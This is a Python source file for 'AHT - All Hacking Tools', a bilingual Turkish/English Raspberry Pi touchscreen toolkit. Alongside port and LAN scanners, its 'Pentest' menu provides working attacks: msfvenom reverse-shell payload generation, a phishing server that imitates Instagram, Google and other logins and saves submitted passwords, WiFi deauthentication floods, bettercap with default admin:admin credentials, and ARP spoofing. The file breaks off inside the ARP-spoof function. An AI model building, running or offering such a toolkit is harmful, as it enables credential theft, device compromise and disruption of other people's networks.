#!/usr/bin/env python3
"""AHT - Raspberry Pi Zero 2W GUI (fullscreen, all tools from main.py)"""
import sys, os, subprocess, threading, urllib.request, urllib.parse, json, socket, time, random, re, hashlib, string, ipaddress

APT = ["python3-tk","python3-pip"]; PIP = ["requests"]

def deps():
    h = []
    if sys.platform.startswith("linux"):
        print("[AHT] Bagimliliklar kontrol...")
        for p in APT:
            r = subprocess.run(["dpkg","-s",p],capture_output=True,text=True)
            if r.returncode:
                print(f"  + {p} eksik...")
                r2 = subprocess.run(["sudo","apt","install","-y",p],capture_output=True,text=True)
                if r2.returncode==0: print(f"  + {p} kuruldu")
                else: print(f"  ! {p} basarisiz"); h.append(p)
        for p in PIP:
            r = subprocess.run([sys.executable,"-m","pip","show",p],capture_output=True,text=True)
            if r.returncode:
                for c in [[sys.executable,"-m","pip","install",p],
                          [sys.executable,"-m","pip","install","--break-system-packages",p],
                          ["sudo",sys.executable,"-m","pip","install",p]]:
                    r2 = subprocess.run(c,capture_output=True,text=True)
                    if r2.returncode==0: break
                if r2.returncode: print(f"  ! pip: {p}"); h.append(p)
                else: print(f"  + pip: {p} kuruldu")
    try: import tkinter
    except: h.append("python3-tk")
    if h:
        print(f"[AHT] Hata: {', '.join(h)}")
        for p in h: print(f"  sudo apt install {p}" if p.startswith("python3-") else f"  pip3 install {p}")
        return False
    return True

if not deps(): sys.exit(1)

import tkinter as tk
from tkinter import ttk, messagebox

BG,FG,BTN,INP,TF="#000000","#ffffff","#555555","#222222","#ffcc00"
F=("DejaVu Sans",10); FB=("DejaVu Sans",11,"bold"); FT=("DejaVu Sans",12,"bold")
FS=("DejaVu Sans",8); FL=("DejaVu Sans",14)

class App:
    def __init__(self):
        self.lang="EN"; self.ps=None; self.kbd_target=None; self.bg={}
        for deneme in range(30):
            try:
                self.root=tk.Tk()
                break
            except tk.TclError:
                if deneme==0: print("[AHT] Ekran bekleniyor...")
                time.sleep(1)
        else:
            print("[AHT] Ekran bulunamadi"); sys.exit(1)
        self.root.title("AHT")
        try: self.root.attributes("-fullscreen",True)
        except: self.root.geometry("480x320")
        try: self.root.tk.call("tk","scaling",1.6)
        except: pass
        self.root.configure(bg=BG)
        self.root.bind("<Button-1>",self.kbd_dismiss,add="+")
        self.f=tk.Frame(self.root,bg=BG)
        self.f.pack(fill="both",expand=True)
        self.cf=tk.Frame(self.f,bg=BG)
        self.cf.pack(fill="both",expand=True)
        self.kb_frame=tk.Frame(self.f,bg="#444")
        self.kbd_olustur()
        self.kb_frame.pack(fill="x",side="top"); self.kb_frame.pack_forget()
        self.show_main()

    def T(self,e,t=None): return e if self.lang=="EN" else (t or e)
    def dil(self): self.lang="TR" if self.lang=="EN" else "EN"; self.show_main()
    def kbd_olustur(self):
        self.kbd_caps=False; self.kbd_harfler=[]; kf=("DejaVu Sans",12)
        for ri,row in enumerate(["QWERTYUIOP","ASDFGHJKL"]):
            for ci,k in enumerate(row): self.kbd_tus(k,ri,ci,kf)
        self.kbd_tus("BS",1,9,kf)
        for ci,k in enumerate("ZXCVBNM"): self.kbd_tus(k,2,ci,kf)
        self.kbd_tus(".",2,7,kf)
        self.kbd_caps_btn=self.kbd_tus("⬆",2,8,kf,cs=2)
        for ci,k in enumerate("1234567890"): self.kbd_tus(k,3,ci,kf)
        self.kbd_tus("SP",4,0,kf,cs=5); self.kbd_tus("@",4,5,kf); self.kbd_tus("▼",4,6,kf)
        self.kbd_tus("SİL",4,7,kf); self.kbd_tus("↵",4,8,kf,cs=2)
        for i in range(10): self.kb_frame.grid_columnconfigure(i,weight=1)
        for i in range(5): self.kb_frame.grid_rowconfigure(i,weight=1,minsize=36)
    def kbd_tus(self,k,r,c,fn,cs=1):
        cmd=lambda k2=k: self.kbd_yaz(k2)
        bg="#555"; fg="#ddd"; kt=k
        if k=="BS": kt="⌫"; bg="#633"
        elif k=="SP": kt="BOŞLUK"; bg="#333"
        elif k=="SİL": kt="SİL"; bg="#663"
        elif k=="⬆": kt="⬇" if self.kbd_caps else "⬆"; bg="#660" if self.kbd_caps else "#555"
        elif k=="↵": kt="↵"; bg="#363"
        elif k=="▼": kt="▼"; bg="#336"
        b=tk.Button(self.kb_frame,text=kt,command=cmd,bg=bg,fg=fg,font=fn,
                  relief="raised",bd=3,activebackground="#777",activeforeground="#fff"
                  )
        b.grid(row=r,column=c,columnspan=cs,padx=2,pady=2,sticky="nsew")
        if k.isalpha() and len(k)==1: self.kbd_harfler.append((b,k))
        return b
    def kbd_show(self,w):
        if not self.kb_frame.winfo_ismapped():
            self.kb_frame.pack(fill="x",side="top")
        self.kbd_target=w
    def kbd_hide(self,ev=None):
        self.kb_frame.pack_forget()
        self.kbd_target=None
    def kbd_yaz(self,k):
        w=self.kbd_target
        if not w: return
        if k=="BS":
            if isinstance(w,tk.Entry):
                p=w.index(tk.INSERT)
                if p>0: w.delete(p-1,tk.INSERT)
            elif isinstance(w,tk.Text):
                p=w.index(tk.INSERT)
                if p!="1.0": w.delete(f"{p}-1c",p)
        elif k=="▼": self.kbd_hide()
        elif k=="↵":
            if isinstance(w,tk.Text): w.insert(tk.INSERT,"\n")
        elif k=="SİL":
            if isinstance(w,tk.Entry): w.delete(0,tk.END)
            elif isinstance(w,tk.Text): w.delete("1.0",tk.END)
        elif k=="SP": w.insert(tk.INSERT," ")
        elif k=="⬆":
            self.kbd_caps=not self.kbd_caps
            for b,ucc in self.kbd_harfler:
                b.config(text=ucc if self.kbd_caps else ucc.lower())
            self.kbd_caps_btn.config(bg="#660" if self.kbd_caps else "#555",
                                     text="⬇" if self.kbd_caps else "⬆")
        elif k=="↵":
            if isinstance(w,tk.Text): w.insert(tk.INSERT,"\n")
        else:
            if k.isalpha() and len(k)==1:
                w.insert(tk.INSERT, k if self.kbd_caps else k.lower())
            else: w.insert(tk.INSERT,k)
    def kbd_dismiss(self,ev=None):
        if ev and self.kb_frame.winfo_ismapped():
            x,y=ev.x_root,ev.y_root
            kx=self.kb_frame.winfo_rootx(); ky=self.kb_frame.winfo_rooty()
            kw=self.kb_frame.winfo_width(); kh=self.kb_frame.winfo_height()
            if not (kx<=x<=kx+kw and ky<=y<=ky+kh):
                if not isinstance(ev.widget,(tk.Entry,tk.Text)):
                    self.root.after(50,self.kbd_hide)

    def bg_yaz(self,ad,t,metin):
        if ad in self.bg: self.bg[ad]["buf"].append(metin)
        if t:
            try: t.insert(tk.END,metin); t.see(tk.END)
            except: pass
    def bg_aktif(self,ad):
        if ad in self.bg and self.bg[ad].get("t"):
            if not self.bg[ad]["t"].is_alive(): self.bg[ad]["run"]=False; return False
            return self.bg[ad]["run"]
        return False
    def bg_yenile(self,ad,t):
        if ad in self.bg:
            for l in self.bg[ad]["buf"]:
                try: t.insert(tk.END,l)
                except: break

    def clr(self):
        self.kbd_hide()
        for w in self.cf.winfo_children(): w.destroy()
        for i in range(20): self.cf.grid_rowconfigure(i,weight=0); self.cf.grid_columnconfigure(i,weight=0)

    def bt(self,t,c,r,c2,**kw):
        rs=kw.pop("rowspan",1); cs=kw.pop("colspan",1)
        kw.setdefault("bg",BTN); kw.setdefault("font",FB); kw.setdefault("activebackground","#777")
        b=tk.Button(self.cf,text=t,command=c,fg=FG,relief="solid",bd=2,highlightthickness=0,activeforeground=FG,cursor="hand2",**kw)
        b.grid(row=r,column=c2,padx=2,pady=2,sticky="nsew",rowspan=rs,columnspan=cs); return b
    def bk(self): self.bt(self.T("< Back","< Geri"),self.ps,0,0,colspan=3,bg="#444")
    def tt(self,t,r=1): tk.Label(self.cf,text=t,bg=BG,fg=TF,font=FT).grid(row=r,column=0,columnspan=3,pady=2)
    def lb(self,t,r,c,**kw):
        kw.pop("rowspan",1); kw.pop("colspan",1)
        kw.setdefault("fg",FG); kw.setdefault("bg",BG); kw.setdefault("font",F)
        tk.Label(self.cf,text=t,**kw).grid(row=r,column=c,sticky="w",padx=2)
    def en(self,r,c,w=14,**kw):
        rs=kw.pop("rowspan",1); cs=kw.pop("colspan",1)
        kw.setdefault("bg",INP); kw.setdefault("fg",FG); kw.setdefault("insertbackground",FG)
        kw.setdefault("font",F); kw.setdefault("bd",1); kw.setdefault("relief","solid")
        kw.setdefault("highlightthickness",1); kw.setdefault("highlightcolor","#f80")
        kw.setdefault("highlightbackground","#666")
        e=tk.Entry(self.cf,width=w,**kw)
        e.grid(row=r,column=c,pady=1,padx=1,sticky="ew",rowspan=rs,columnspan=cs)
        e.bind("<FocusIn>",lambda ev: self.kbd_show(ev.widget))
        return e
    def tx(self,r,c,**kw):
        rs=kw.pop("rowspan",1); cs=kw.pop("colspan",3)
        pdx=kw.pop("padx",1); pdy=kw.pop("pady",1)
        kw.setdefault("bg",BG); kw.setdefault("fg",FG); kw.setdefault("bd",0)
        kw.setdefault("font",FS); kw.setdefault("height",3); kw.setdefault("width",38)
        f=tk.Frame(self.cf,bg=BG); f.grid(row=r,column=c,sticky="nsew",rowspan=rs,columnspan=cs,padx=pdx,pady=pdy)
        f.grid_columnconfigure(0,weight=1); f.grid_rowconfigure(0,weight=1)
        t=tk.Text(f,**kw); t.grid(row=0,column=0,sticky="nsew")
        sb=tk.Scrollbar(f,orient="vertical",command=t.yview,bg="#555",activebackground="#777",troughcolor="#333")
        sb.grid(row=0,column=1,sticky="ns")
        t.config(yscrollcommand=sb.set); return t
    def ac(self,t,c,r,bg="#008800"): self.bt(t,c,r,0,colspan=3,bg=bg)
    def cb(self,r,c,vs,v,w=12):
        m=ttk.Combobox(self.cf,textvariable=v,values=vs,state="readonly",width=w,font=F)
        m.grid(row=r,column=c,pady=1,padx=1,sticky="w"); return m
    def np(self,e,sr):
        for ri,ks in enumerate([["1","2","3"],["4","5","6"],["7","8","9"],[".","0","BS"]]):
            for ci,k in enumerate(ks):
                def ek(kv=k):
                    if kv=="BS": t=e.get()[:-1]; e.delete(0,tk.END); e.insert(0,t)
                    else: e.insert(tk.END,kv)
                self.bt(k,ek,sr+ri,ci,font=FL)
    def be(self,e,cb): e.bind("<Return>",lambda ev: cb())
    def cg(self,r,c2):
        for i in range(r): self.cf.grid_rowconfigure(i,weight=1 if i>0 else 0)
        for i in range(c2): self.cf.grid_columnconfigure(i,weight=1)

    # ===================== MAIN =====================
    def show_main(self):
        self.ps=self.show_main; self.clr(); self.cg(5,3)
        tk.Label(self.cf,text="AHT - All Hacking Tools",bg=BG,fg=TF,font=FT).grid(row=0,column=0,columnspan=3,pady=3)
        for t,c,r,c2 in [(self.T("Network","Ag"),self.m_net,1,0),(self.T("Pentest","Sizma"),self.m_pent,1,1),
            (self.T("OSINT","OSINT"),self.m_osint,1,2),(self.T("Attack","Saldiri"),self.m_atk,2,0),
            (self.T("Tools","Araclar"),self.m_tools,2,1),(self.T("Internet","Internet"),self.m_internet,2,2),
            (self.T("My IP","IP'm"),self.myip,3,0),(self.T("Update","Guncelle"),self.upd,3,1),
            (self.T("Exit","Cikis"),self.root.destroy,3,2)]:
            self.bt(t,c,r,c2,bg="#660000" if t in (self.T("Exit","Cikis"),) else BTN)
        self.bt(self.T("Auto Start","Oto Acilis"),self.otostart,4,0,bg="#555")
        self.bt(self.T("EN","TR"),self.dil,4,2,bg="#444",font=FS)

    # ===================== NETWORK =====================
    def m_net(self):
        self.ps=self.show_main; self.clr(); self.cg(5,3); self.bk(); self.tt(self.T("NETWORK","AG"))
        for t,c,r,c2 in [(self.T("IP Geo","IP Konum"),self.geo,2,0),(self.T("Port Scan","Port Tara"),self.port,2,1),
            (self.T("Net Scan","Ag Tara"),self.ipscan,2,2),(self.T("Whois","Whois"),self.whois,3,0),
            (self.T("DNS","DNS"),self.dns,3,1),(self.T("Subnet","Alt Ag"),self.sub,3,2),
            (self.T("Traceroute","Trace"),self.trace,4,0),(self.T("Net Info","Ag Bilgi"),self.nfo,4,1),
            (self.T("Router Scan","Modem Tara"),self.rtr,4,2)]: self.bt(t,c,r,c2)

    def geo(self):
        self.ps=self.m_net; self.clr(); self.cg(9,3); self.bk(); self.tt(self.T("IP Geo","IP Konum"))
        self.lb(self.T("IP:","IP:"),2,0); e=self.en(2,1); e.insert(0,"8.8.8.8"); self.np(e,4)
        t=self.tx(3,0,height=2)
        def q():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Querying...","Sorgulaniyor...\n"))
            try:
                r=urllib.request.urlopen(f"http://ip-api.com/json/{e.get()}",timeout=10); d=json.loads(r.read())
                if d.get("status")=="success":
                    t.insert(tk.END,f"{d['query']} - {d['city']}, {d['country']}\n{d.get('isp','?')}\n{d.get('as','?')}")
                else: t.insert(tk.END,self.T("Not found","Bulunamadi"))
            except Exception as ex: t.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        self.be(e,q); self.ac(self.T("QUERY","SORGULA"),q,8)

    def port(self):
        self.ps=self.m_net; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("Port Scan","Port Tara"))
        self.lb(self.T("Host:","Hedef:"),2,0); h=self.en(2,1); h.insert(0,"127.0.0.1")
        self.lb(self.T("Ports:","Portlar:"),3,0); p=self.en(3,1); p.insert(0,"1-1024")
        t=self.tx(4,0,height=3)
        def q():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Scanning...","Taranıyor...\n")); self.f.update()
            prts=p.get().split(","); host=h.get()
            if "-" in prts[0]:
                a,b=prts[0].split("-"); prts=[str(i) for i in range(int(a),int(b)+1)]
            top=len(prts)
            for i,pr in enumerate(prts):
                pr=pr.strip()
                if not pr.isdigit(): continue
                try:
                    s=socket.socket(); s.settimeout(0.3)
                    if s.connect_ex((host,int(pr)))==0:
                        try: sv=socket.getservbyport(int(pr))
                        except: sv="?"
                        t.insert(tk.END,f"  {pr}/{sv} open\n"); self.f.update()
                    s.close()
                except: pass
                if i%50==0: t.insert(tk.END,f"[{i}/{top}] ")
            t.insert(tk.END,self.T("Done","Tamam"))
        self.be(h,q); self.be(p,q); self.ac(self.T("SCAN","TARA"),q,6)

    def ipscan(self):
        self.ps=self.m_net; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("Net Scan","Ag Tara"))
        self.lb(self.T("Network:","Ag:"),2,0); e=self.en(2,1); e.insert(0,"192.168.1.0/24")
        t=self.tx(3,0,height=4)
        def q():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Scanning...","Taranıyor...\n")); self.f.update()
            try:
                net=ipaddress.ip_network(e.get(),strict=False); n=0
                # ARP yontemi (hizli)
                arp_g={"nt":"arp -a","linux":"arp -n 2>/dev/null || ip neigh show"}
                r=subprocess.run(arp_g.get(os.name,"arp -n"),shell=True,capture_output=True,text=True,timeout=5)
                bulunan=set()
                for l in r.stdout.split("\n"):
                    m=re.search(r'(\d+\.\d+\.\d+\.\d+)',l)
                    if m: bulunan.add(m.group(1))
                for ip in net.hosts():
                    s=str(ip)
                    if s in bulunan:
                        try: hn=socket.gethostbyaddr(s)[0]
                        except: hn=""
                        t.insert(tk.END,f"  {s} {hn}\n"); n+=1; self.f.update()
                if n==0:
                    t.insert(tk.END,self.T("No ARP results, trying TCP scan...","ARP sonuc yok, TCP deneniyor...\n")); self.f.update()
                    for ip in net.hosts():
                        for po2 in [80,443,22,8080]:
                            try:
                                s=socket.socket(); s.settimeout(0.1)
                                if s.connect_ex((str(ip),po2))==0:
                                    try: hn=socket.gethostbyaddr(str(ip))[0]
                                    except: hn=""
                                    t.insert(tk.END,f"  {ip} {hn}\n"); n+=1; self.f.update()
                                    s.close(); break
                                s.close()
                            except: pass
                t.insert(tk.END,self.T(f"Done. {n} found",f"Tamam. {n} bulundu"))
            except Exception as ex: t.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        self.be(e,q); self.ac(self.T("SCAN","TARA"),q,6)

    def whois(self):
        self.ps=self.m_net; self.clr(); self.cg(7,3); self.bk(); self.tt("Whois")
        self.lb("Domain:",2,0); e=self.en(2,1); e.insert(0,"example.com")
        t=self.tx(3,0,height=4)
        def q():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Querying...","Sorgulaniyor...\n"))
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(10)
                s.connect(("whois.iana.org",43)); s.send((e.get()+"\r\n").encode()); d=b""
                while True:
                    b2=s.recv(4096)
                    if not b2: break
                    d+=b2
                s.close(); t.insert(tk.END,d.decode("utf-8","ignore")[:500])
            except Exception as ex: t.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        self.be(e,q); self.ac(self.T("QUERY","SORGULA"),q,6)

    def dns(self):
        self.ps=self.m_net; self.clr(); self.cg(7,3); self.bk(); self.tt("DNS")
        self.lb("Domain:",2,0); e=self.en(2,1); e.insert(0,"example.com")
        t=self.tx(3,0,height=3)
        def q():
            t.delete(1.0,tk.END)
            try: t.insert(tk.END,f"A: {socket.gethostbyname(e.get())}\n")
            except: t.insert(tk.END,self.T("Not resolved","Cozulemedi\n"))
            try:
                r=socket.gethostbyname_ex(e.get())
                t.insert(tk.END,f"Aliases: {', '.join(r[0]) if r[0] else '-'}\nAll: {', '.join(r[2])}\n")
            except: pass
            try: t.insert(tk.END,f"MX: {socket.getfqdn(e.get())}\n")
            except: pass
        self.be(e,q); self.ac(self.T("LOOKUP","SORGULA"),q,6)

    def sub(self):
        self.ps=self.m_net; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("Subnet","Alt Ag"))
        self.lb("CIDR:",2,0); e=self.en(2,1); e.insert(0,"192.168.1.0/24")
        t=self.tx(3,0,height=4)
        def q():
            t.delete(1.0,tk.END)
            try:
                n=ipaddress.ip_network(e.get(),strict=False); hl=list(n.hosts())
                t.insert(tk.END,f"{self.T('Network','Ag')}: {n}\n{self.T('Mask','Maske')}: {n.netmask}\n"
                    f"{self.T('Broadcast','Yayin')}: {n.broadcast_address}\n{self.T('Hosts','Kullanici')}: {n.num_addresses-2}\n"
                    f"{self.T('First','Ilk')}: {hl[0]}\n{self.T('Last','Son')}: {hl[-1]}\n"
                    f"{self.T('Wildcard','Wildcard')}: {n.hostmask}")
            except Exception as ex: t.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        self.be(e,q); self.ac(self.T("CALC","HESAPLA"),q,6)

    def trace(self):
        self.ps=self.m_net; self.clr(); self.cg(7,3); self.bk(); self.tt("Traceroute")
        self.lb(self.T("Host:","Hedef:"),2,0); e=self.en(2,1); e.insert(0,"8.8.8.8")
        t=self.tx(3,0,height=4)
        def q():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Running...","Calisiyor...\n"))
            try:
                cmd=["tracert","-n","-w","2",e.get()] if os.name=="nt" else ["traceroute","-n","-w","2",e.get()]
                r=subprocess.run(cmd,capture_output=True,text=True,timeout=30)
                t.insert(tk.END,(r.stdout or r.stderr)[:600])
            except Exception as ex: t.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        self.be(e,q); self.ac(self.T("TRACE","TRACE"),q,6)

    def nfo(self):
        self.ps=self.m_net; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("Net Info","Ag Bilgisi"))
        t=self.tx(2,0,height=5)
        def q():
            t.delete(1.0,tk.END)
            try: h=socket.gethostname(); t.insert(tk.END,f"Host: {h}\nIP: {socket.gethostbyname(h)}\n")
            except: pass
            if os.name=="nt":
                r=subprocess.run("ipconfig",capture_output=True,text=True,shell=True)
                for l in r.stdout.split("\n"):
                    if any(x in l for x in ["IPv4","Subnet","Gateway"]): t.insert(tk.END,l.strip()+"\n")
            else:
                r=subprocess.run("ip addr show",capture_output=True,text=True,shell=True)
                for l in r.stdout.split("\n"):
                    if "inet " in l or "ether " in l: t.insert(tk.END,l.strip()+"\n")
        q(); self.ac(self.T("REFRESH","YENILE"),q,6)

    def rtr(self):
        self.ps=self.m_net; self.clr(); self.cg(7,3); self.bk(); self.tt(self.T("Router Scan","Modem Tara"))
        self.lb(self.T("Gateway:","Ag Geçidi:"),2,0); e=self.en(2,1); e.insert(0,"192.168.1.1")
        t=self.tx(3,0,height=4)
        def q():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Scanning...","Taranıyor...\n")); self.f.update()
            for p2 in [80,443,22,23,21,8080,8443,81,7547,5555,2323,5000,7000,9090]:
                try:
                    s=socket.socket(); s.settimeout(0.5)
                    if s.connect_ex((e.get(),p2))==0:
                        sv={80:"HTTP",443:"HTTPS",22:"SSH",23:"Telnet",21:"FTP",8080:"HTTP-A",
                            8443:"HTTPS-A",81:"HTTP",7547:"TR-069",5555:"ADB",2323:"Telnet-A",
                            5000:"?",7000:"?",9090:"?"}.get(p2,"?")
                        t.insert(tk.END,f"  {p2}/{sv} {self.T('open','acik')}\n")
                    s.close()
                except: pass
            t.insert(tk.END,self.T("Done","Tamam"))
        self.be(e,q); self.ac(self.T("SCAN","TARA"),q,6)

    # ===================== PENTEST =====================
    def m_pent(self):
        self.ps=self.show_main; self.clr(); self.cg(5,3); self.bk(); self.tt(self.T("PENTEST","SIZMA"))
        for t,c,r,c2 in [("MSFVenom",self.msf,2,0),(self.T("Phishing","Phishing"),self.phish,2,1),
            ("Bettercap",self.bcap,2,2),(self.T("WiFi Deauth","WiFi Deauth"),self.deauth,3,0),
            ("Nikto",self.nikto,3,1),(self.T("ARP Spoof","ARP Zehirle"),self.arps,3,2),
            (self.T("Packet Sniff","Paket Yakala"),self.sniff,4,0),(self.T("Disconnect","Baglantiyi Kes"),self.disc,4,1),
            (self.T("Block Internet","Internet Engelle"),self.block,4,2)]: self.bt(t,c,r,c2)

    def msf(self):
        self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt("MSFVenom")
        r2=subprocess.run("which msfvenom 2>/dev/null || where msfvenom 2>nul",shell=True,capture_output=True,text=True)
        if not r2.stdout.strip():
            self.tx(2,0,height=2).insert(tk.END,self.T("Metasploit not found.\nInstall from metasploit.com","Metasploit bulunamadi.\nmetasploit.com adresinden kurun"))
            return
        self.lb("LHOST:",2,0); lh=self.en(2,1); lh.insert(0,"192.168.1.1")
        self.lb("LPORT:",3,0); lp=self.en(3,1); lp.insert(0,"4444")
        pv=tk.StringVar(value="android/meterpreter/reverse_tcp")
        self.cb(4,0,["android/meterpreter/reverse_tcp","windows/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp","osx/x64/meterpreter/reverse_tcp",
            "python/meterpreter/reverse_tcp","php/meterpreter/reverse_tcp"],pv,w=26)
        t=self.tx(5,0,height=2)
        def q():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Generating...","Olusturuluyor...\n"))
            pl=pv.get(); ex={"android":"apk","windows":"exe","linux":"elf","osx":"macho","python":"py","php":"php"}
            ex2={"android":"apk","windows":"exe","linux":"elf","osx":"macho","python":"py","php":"php",
                 "ruby":"rb","perl":"pl","powershell":"ps1","bash":"sh"}
            ext=ex.get(pl.split("/")[0],"bin")
            out=os.path.join(os.path.expanduser("~"),f"payload.{ext}")
            r=subprocess.run(["msfvenom","-p",pl,f"LHOST={lh.get()}",f"LPORT={lp.get()}","-o",out],
                           capture_output=True,text=True,timeout=120)
            if r.returncode==0: t.insert(tk.END,self.T(f"Saved: {out}",f"Kaydedildi: {out}"))
            else: t.insert(tk.END,(r.stderr or r.stdout)[:300])
        self.ac(self.T("GENERATE","OLUSTUR"),q,7)

    def phish(self):
        self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt("Phishing")
        tm=tk.StringVar(value="instagram")
        self.lb(self.T("Template:","Sablon:"),2,0)
        self.cb(2,1,["instagram","twitter","google","facebook","turkcell","linkedin","github"],tm,w=14)
        self.lb(self.T("Port:","Port:"),3,0); pt=self.en(3,1); pt.insert(0,"8080")
        t=self.tx(4,0,height=3)
        def q():
            htd=os.path.join(os.path.expanduser("~"),"aht_phish"); os.makedirs(htd,exist_ok=True)
            with open(os.path.join(htd,"index.html"),"w") as f:
                f.write(f"<html><body><h2>{tm.get()} Login</h2><form method=POST action='/submit'>"
                        f"<input name=u placeholder='Username'><br><input name=p type=password>"
                        f"<br><input type=submit value='Login'></form></body></html>")
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Starting server...","Server baslatiliyor...\n"))
            # Basit HTTP server
            def run():
                try:
                    import http.server
                    class H(http.server.BaseHTTPRequestHandler):
                        def do_GET(self):
                            self.send_response(200)
                            self.send_header("Content-type","text/html; charset=utf-8")
                            self.end_headers()
                            with open(os.path.join(htd,"index.html"),"rb") as f: self.wfile.write(f.read())
                        def do_POST(self):
                            l=int(self.headers.get("Content-length",0))
                            b=self.rfile.read(l).decode("utf-8","ignore")
                            with open(os.path.join(htd,"kayitlar.txt"),"a") as f: f.write(f"{time.ctime()} {self.client_address[0]}: {b}\n")
                            self.send_response(302); self.send_header("Location","https://google.com"); self.end_headers()
                    s=http.server.HTTPServer(("0.0.0.0",int(pt.get())),H)
                    s.serve_forever()
                except: pass
            threading.Thread(target=run,daemon=True).start()
            t.insert(tk.END,self.T(f"Server running on port {pt.get()}","{pt.get()} portunda server calisiyor\nKullanici bilgileri kaydediliyor"))
        self.ac(self.T("START","BASLAT"),q,7)

    def bcap(self):
        self.ps=self.m_pent; self.clr(); self.cg(5,3); self.bk(); self.tt("Bettercap")
        t=self.tx(2,0,height=3)
        r=subprocess.run("which bettercap 2>/dev/null || where bettercap 2>nul",shell=True,capture_output=True,text=True)
        if r.stdout.strip():
            t.insert(tk.END,self.T("Starting at http://127.0.0.1:8081\nadmin:admin","http://127.0.0.1:8081\ngiris: admin:admin"))
            subprocess.Popen(["bettercap","-eval","set api.rest.username admin; set api.rest.password admin; api.rest on"],
                           stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        else: t.insert(tk.END,self.T("bettercap not found","bettercap bulunamadi\nsudo apt install bettercap"))

    def deauth(self):
        self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt(self.T("WiFi Deauth","WiFi Deauth"))
        if os.name=="nt": self.tx(2,0,height=1).insert(tk.END,self.T("Linux only","Sadece Linux")); return
        r=subprocess.run("ip link show|grep -E '^[0-9]'|cut -d: -f2",shell=True,capture_output=True,text=True)
        ifs=[x.strip() for x in r.stdout.split() if x.strip() and x.strip()!="lo"]
        if not ifs: self.tx(2,0,height=1).insert(tk.END,self.T("No interfaces","Arayuz yok")); return
        self.lb(self.T("Interface:","Arayuz:"),2,0); iv=tk.StringVar(value=ifs[0])
        self.cb(2,1,ifs,iv,w=12)
        self.lb("BSSID:",3,0); e=self.en(3,1); e.insert(0,"AA:BB:CC:DD:EE:FF")
        mv=tk.StringVar(value="aireplay")
        self.cb(4,0,["aireplay","mdk4","scapy"],mv,w=10)
        t=self.tx(5,0,height=2)
        def q():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Running...","Calisiyor...\n")); self.f.update()
            ifc=iv.get(); b=e.get(); met=mv.get()
            try:
                if met=="aireplay":
                    subprocess.run(["sudo","airmon-ng","start",ifc],capture_output=True)
                    subprocess.run(["sudo","aireplay-ng","-0","0","-a",b,f"{ifc}mon"],timeout=10)
                    subprocess.run(["sudo","airmon-ng","stop",f"{ifc}mon"],capture_output=True)
                elif met=="mdk4":
                    subprocess.run(["sudo","mdk4",ifc,"d","-a",b],timeout=10)
                elif met=="scapy":
                    subprocess.run(["sudo","python3","-c",f"""
import sys; from scapy.all import RadioTap,Dot11,Dot11Deauth,sendp
pkt=RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2='{b}',addr3='{b}')/Dot11Deauth()
sendp(pkt,iface='{ifc}',count=500,inter=0.1,verbose=0)
"""],timeout=60)
                t.insert(tk.END,self.T("Done (10s attack)","Tamam (10s saldiri)"))
            except Exception as ex: t.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        self.ac(self.T("ATTACK","SALDIR"),q,7)

    def nikto(self):
        self.ps=self.m_pent; self.clr(); self.cg(7,3); self.bk(); self.tt("Nikto")
        self.lb("URL:",2,0); e=self.en(2,1); e.insert(0,"http://127.0.0.1")
        t=self.tx(3,0,height=4)
        def q():
            t.delete(1.0,tk.END); t.insert(tk.END,self.T("Running nikto...","Nikto calisiyor...\n"))
            try:
                r=subprocess.run(["nikto","-h",e.get()],capture_output=True,text=True,timeout=120)
                t.insert(tk.END,(r.stdout or r.stderr)[:600])
            except Exception as ex: t.insert(tk.END,f"{self.T('Error','Hata')}: {ex}")
        self.be(e,q); self.ac(self.T("SCAN","TARA"),q,6)

    def arps(self):
        self.ps=self.m_pent; self.clr(); self.cg(8,3); self.bk(); self.tt(self.T("ARP Spoof","ARP Zehirle"))
        if os.name=="nt": self.tx(2,0,height=1).insert(tk.END,self.T("Linux only","Sadece Linux")); return
        self.lb(self.T("Target:","Hedef:"),2,0); tg=self.en(2,1); tg.insert(0,"192.168.1.100")
        self.lb(self.T("Gateway:","Ag Geçidi:"),3,0); gw=self.en(3,1); gw.insert(0,"192.168.1.1")
        self.lb(self.T("Interface:","Arayuz:"),4,0); iv=tk.StringVar(value="eth0")
        r=subprocess.run("ip -o link show|grep -v lo|cut -d: -f2",shell=True,capture_output=True,text=True)
        ifs=[x.strip() for x in r.stdout.split() if x.strip()]
        if ifs: iv.set(ifs[0])
        self.cb(4,1,ifs,iv,w=12)
        t=self.tx(5,0,height=2); self.sp_t=t
        if self.bg_aktif("arps"):
            self.bg_yenile("arps",t); self.sp_stop=self.bg["arps"]["stop"]
            self.bg_yaz("arps",t,self.T(" (running in bg)"," (arka planda calisiyor)\n"))
            self.bt(self.T("STOP","DURDUR"),lambda: (setattr(self,"sp_stop",True),self.bg_durdur("arps"),self.arps()),6,1,bg="#660000")
            return
        self.sp_stop=False
        def basla():
            self.sp_stop=False; t.delete(1.0,tk.END)
            self.bg_yaz("arps",t,self.T("Spoofing... STOP to end","Zehirleme... DURDUR ile bitir\n")); self.f.update()
